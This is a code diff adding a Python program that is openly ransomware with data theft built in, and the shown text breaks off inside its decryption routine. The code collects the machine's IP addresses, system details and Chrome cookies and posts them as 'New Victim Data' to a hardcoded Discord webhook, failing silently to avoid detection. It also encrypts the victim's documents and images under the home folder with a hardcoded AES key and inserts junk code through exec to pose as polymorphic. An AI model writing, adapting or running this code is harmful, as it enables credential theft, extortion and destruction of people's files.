@@ -1,0 +1,145 @@
+import os
+import random
+import string
+import requests
+import json
+import browsercookie
+import psutil
+import socket
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from Crypto.Random import get_random_bytes
+import base64
+import shutil
+import tkinter as tk
+from tkinter import messagebox
+
+# Hardcoded decryption key
+DECRYPTION_KEY = "mango380%".ljust(32)[:32].encode('utf-8')  # Ensure key is 32 bytes for AES-256
+WEBHOOK_URL = "https://discord.com/api/webhooks/1435288952851529740/AbCt00lH-4e8HPf7bLpnDOQ83lHDVHUDIVSrTeNnUuyXAA-QMiv4bu3g4H8t5RvXeuT_"  # Replace with actual webhook URL
+
+# Polymorphic code generation: Randomize variable names and junk code
+def generate_random_string(length):
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(length))
+
+def insert_junk_code():
+    junk_snippets = [
+        "x = 0; for i in range(100): x += i",
+        "useless_var = ' '.join(['a'] * 10)",
+        "temp = [i for i in range(50) if i % 2 == 0]"
+    ]
+    return random.choice(junk_snippets)
+
+# Data exfiltration: Harvest sensitive data
+def harvest_data():
+    data = {}
+    # Get IP address (Private IP)
+    try:
+        private_ip = socket.gethostbyname(socket.gethostname())
+        data['private_ip'] = private_ip
+    except:
+        data['private_ip'] = "Unable to retrieve Private IP"
+    # Get Public IP
+    try:
+        public_ip = requests.get('https://api.ipify.org').text
+        data['public_ip'] = public_ip
+    except:
+        data['public_ip'] = "Unable to retrieve Public IP"
+    # Get system info
+    try:
+        data['system_info'] = {
+            'cpu': psutil.cpu_percent(),
+            'memory': psutil.virtual_memory().percent,
+            'os': os.name
+        }
+    except:
+        data['system_info'] = "Unable to retrieve system info"
+    # Extract browser cookies (for Chrome, Firefox, etc.)
+    try:
+        cj = browsercookie.chrome()  # Requires browsercookie library
+        cookies = []
+        for cookie in cj:
+            cookies.append({
+                'name': cookie.name,
+                'value': cookie.value,
+                'domain': cookie.domain
+            })
+        data['cookies'] = cookies[:10]  # Limit to 10 for brevity
+    except:
+        data['cookies'] = "Unable to retrieve cookies"
+    # Placeholder for passwords (real-world would involve keyloggers or credential dumping)
+    data['passwords'] = "Sample password data (placeholder)"
+    return data
+
+# Send harvested data to Discord webhook
+def send_to_webhook(data):
+    payload = {
+        'content': f"**New Victim Data**\n```json\n{json.dumps(data, indent=2)}\n```"
+    }
+    try:
+        requests.post(WEBHOOK_URL, json=payload)
+    except:
+        pass  # Fail silently to avoid detection
+
+# AES Encryption function
+def encrypt_file(file_path):
+    try:
+        # Generate a random IV (Initialization Vector) for CBC mode
+        iv = get_random_bytes(AES.block_size)
+        cipher = AES.new(DECRYPTION_KEY, AES.MODE_CBC, iv)
+        # Read file content
+        with open(file_path, 'rb') as f:
+            plaintext = f.read()
+        # Pad the data to match block size
+        padded_data = pad(plaintext, AES.block_size)
+        encrypted_data = cipher.encrypt(padded_data)
+        # Write IV + encrypted data back to file
+        with open(file_path, 'wb') as f:
+            f.write(iv + encrypted_data)
+        return True
+    except:
+        return False
+
+# AES Decryption function
+def decrypt_file(file_path):
+    try:
+        # Read the IV and encrypted data from the file
+        with open(file_path, 'rb') as f:
+            iv = f.read(AES.block_size)  # First 16 bytes are the IV
+            encrypted_data = f.read()    # Rest is the encrypted content
+        
+        # Create cipher object with the same key and IV
+        cipher = AES.new(DECRYPTION_KEY, AES.MODE_CBC, iv)
+        # Decrypt the data
+        padded_data = cipher.decrypt(encrypted_data)
+        # Unpad the decrypted data
+        plaintext = unpad(padded_data, AES.block_size)
+        # Write the decrypted content back to the file
+        with open(file_path, 'wb') as f:
+            f.write(plaintext)
+        return True
+    except:
+        return False
+
+# Traverse directories and encrypt files
+def encrypt_files():
+    target_extensions = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png']
+    for root, dirs, files in os.walk(os.path.expanduser("~")):
+        # Polymorphic junk code insertion
+        exec(insert_junk_code())
+        for file in files:
+            if any(file.endswith(ext) for ext in target_extensions):
+                file_path = os.path.join(root, file)
+                try:
+                    encrypt_file(file_path)
+                except:
+                    continue
+
+# Traverse directories and decrypt files
+def decrypt_files():
+    target_extensions = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png']
+    for root, dirs, files in os.walk(os.path.expanduser("~")):
+        for file in files:
+            if any(file.endswith(ext) for ext in target_extensions):
+                file_path = os.pa
